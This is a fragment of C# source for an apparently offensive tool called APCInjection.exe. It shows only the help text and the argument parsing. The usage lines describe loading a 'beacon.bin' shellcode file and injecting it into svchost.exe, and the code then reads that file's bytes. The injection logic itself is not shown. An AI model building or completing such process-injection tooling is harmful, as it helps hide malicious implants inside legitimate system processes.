    ...
    class Program
    {
        static void Main(string[] args)
        {
            ...
            if (args[0] == "-h")
            {
                ...
                Console.WriteLine("APCInjection.exe");
                Console.WriteLine("APCInjection.exe -f beacon.bin -a \"C:\\Windows\\System32\\svchost.exe\"");
                Console.WriteLine("APCInjection.exe -f \"C:\\temp\\beacon.bin\" -a \"C:\\Windows\\System32\\svchost.exe\"");
                Console.WriteLine();
                Environment.Exit(0);
            }
            else if (args[0] == "-f" && args[2] == "-a")
            {
                rawfile = args[1];
                app = args[3];
            }
            ...
            safe = System.IO.File.ReadAllBytes(rawfile);
